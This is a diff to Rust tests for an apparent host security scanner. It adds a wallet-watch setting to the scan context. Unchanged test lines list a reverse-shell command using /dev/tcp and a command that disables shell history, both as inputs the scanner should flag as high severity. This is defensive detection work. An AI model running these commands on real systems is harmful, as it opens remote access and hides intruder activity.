@@ -67,7 +67,7 @@ fn capabilities_are_decoded_and_judged() {
 
     let sys = SysRoot::new("/nonexistent");
     let cfg = Config::default();
-    let ctx = ScanCtx { sys: &sys, cfg: &cfg, deep_pid_scan: false, privileged: true, processes: &[] };
+    let ctx = ScanCtx { sys: &sys, cfg: &cfg, deep_pid_scan: false, wallet_watch_secs: 0, privileged: true, processes: &[] };
     let judge = |path: &str, caps: &[&str]| {
         let mut col = Collector::default();
         judge_capabilities(&ctx, path, caps, "", &mut col);
@@ -162,7 +162,7 @@ fn software_sources_are_read_in_both_formats() {
 fn shell_history_shows_only_suspicious_commands() {
     let sys = SysRoot::new("/nonexistent");
     let cfg = Config::default();
-    let ctx = ScanCtx { sys: &sys, cfg: &cfg, deep_pid_scan: false, privileged: true, processes: &[] };
+    let ctx = ScanCtx { sys: &sys, cfg: &cfg, deep_pid_scan: false, wallet_watch_secs: 0, privileged: true, processes: &[] };
     let judge = |c: &str| judge_command(&ctx, c).map(|(s, _)| s);
     assert_eq!(judge("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"), Some(Severity::High));
     assert_eq!(judge("export HISTFILE=/dev/null"), Some(Severity::High));
